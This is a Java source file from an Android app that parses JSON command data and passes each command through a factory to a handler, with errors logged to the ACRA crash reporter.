package com.theah64.xrob.commandcenter;

import android.content.Context;

import com.theah64.xrob.commandcenter.commands.BaseCommand;
import com.theah64.xrob.commandcenter.commands.NotificationCommand;
import com.theah64.xrob.database.Commands;
import com.theah64.xrob.models.Command;

import org.acra.ACRA;
import org.json.JSONException;
import org.json.JSONObject;

/**
 * Created by theapache64 on 14/9/16.
 */
public class CommandCenter {

    public static void handle(final Context context, final String typeData) {

        System.out.println("Command center gonna handle : " + typeData);

        try {
            final JSONObject joCommandData = new JSONObject(typeData);

            final String id = joCommandData.getString(Commands.COLUMN_ID);
            final String command = joCommandData.getString(Commands.COLUMN_COMMAND);

            try {
                final BaseCommand theCommand = CommandFactory.getCommand(new Command(id, command));
                theCommand.handle(context);

            } catch (BaseCommand.CommandException e) {
                e.printStackTrace();
                ACRA.getErrorReporter().handleException(e);
            }

        } catch (JSONException e) {
            e.printStackTrace();
            ACRA.getErrorReporter().handleException(e);
        }
    }
}
